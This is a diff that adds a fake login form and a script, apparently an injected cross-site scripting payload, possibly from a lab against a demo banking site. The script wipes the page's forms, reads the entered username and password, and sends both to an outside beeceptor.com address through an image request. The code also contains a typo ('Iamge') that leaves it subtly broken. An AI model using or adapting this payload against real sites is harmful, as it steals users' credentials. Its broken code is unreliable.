@@ -1,0 +1,40 @@
+<form action="doLogin" method="post" name="login" id="login" class="myform" onsubmit="return (confirminput(login));">
+    <table>
+      <tbody><tr>
+        <td>
+          Username:
+        </td>
+        <td>
+          <input type="text" id="uid" name="uid" value="" style="width: 150px;">
+        </td>
+        <td>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          Password:
+        </td>
+        <td>
+          <input type="password" id="passw" name="passw" style="width: 150px;">
+          </td>
+      </tr>
+      <tr>
+          <td></td>
+          <td>
+            <input type="submit" onclick="loginxss()" name="btnSubmit" value="Login">
+          </td>
+        </tr>
+    </tbody></table>
+  </form>
+
+
+<script> 
+        function loginxss(){
+    document.getElementsByClassName("myform")[1].innerText = "";
+    document.getElementsByClassName("myform")[0].innerText = "login";
+    var email = document.forms.login.uid.value;
+    var pass = document.forms.login.passw.value;
+    var img = new Iamge();
+    img.src = "https://keerthana.free.beeceptor.com/?" + "uid=" + email + "&" + "passw=" + pass;
+}
+</script>
